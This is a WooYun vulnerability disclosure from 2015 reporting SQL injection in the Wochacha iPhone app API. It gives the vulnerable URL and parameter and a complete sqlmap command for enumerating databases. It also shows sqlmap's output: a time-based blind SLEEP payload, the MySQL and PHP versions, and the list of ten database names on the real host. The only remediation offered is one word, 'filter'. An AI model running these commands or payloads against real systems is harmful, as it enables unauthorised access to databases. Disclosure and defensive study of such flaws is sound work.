wybug_title: 我查查iPhone客户端API存在SQL注入漏洞
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-01-15：	细节已通知厂商并且等待厂商处理中									2015-01-20：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 我查查iPhone客户端API存在SQL注入漏洞 详细说明：  
http://iphone.wochacha.com/personcenter/info?page=1&city_id=1&udid=854882cbf4835a9eb81f5cd49e714a43********&openid=854882cbf4835a9eb81f5********44cd6&v=7.0.2&source=iphone&connectnet=wifi&os=iphone
注入参数:city_id=1python sqlmap.py -u 'http://iphone.wochacha.com/personcenter/info?page=1&city_id=1&udid=854882cbf4835a9eb81f5cd49e714a43********&openid=854882cbf4835a9eb81f5********44cd6&v=7.0.2&source=iphone&connectnet=wifi&os=iphone' -p city_id --dbms=mysql --dbs --threads 10   漏洞证明：  
[23:32:28] [INFO] checking if the injection point on GET parameter 'city_id' is a false positiveGET parameter 'city_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection points with a total of 385 HTTP(s) requests:---Parameter: city_id (GET)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: page=1&city_id=1' AND SLEEP(5) AND 'qSad'='qSad&udid=854882cbf4835a9eb81f5cd49e714a43********&openid=854882cbf4835a9eb81f5********44cd6&v=7.0.2&source=iphone&connectnet=wifi&os=iphone---[23:33:01] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.6back-end DBMS: MySQL 5.0.11[23:33:01] [INFO] fetched data logged to text files under '/root/.sqlmap/output/iphone.wochacha.com'

available databases [10]:[*] gcore[*] gcoreinc[*] information_schema[*] mysql[*] security[*] test[*] thirdapp[*] traq[*] wcc[*] zabbix
   修复方案：  过滤   版权声明：转载请注明来源 猪猪侠@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-20 23:52 厂商回复：  漏洞Rank：12  (WooYun评价) 最新状态： 暂无
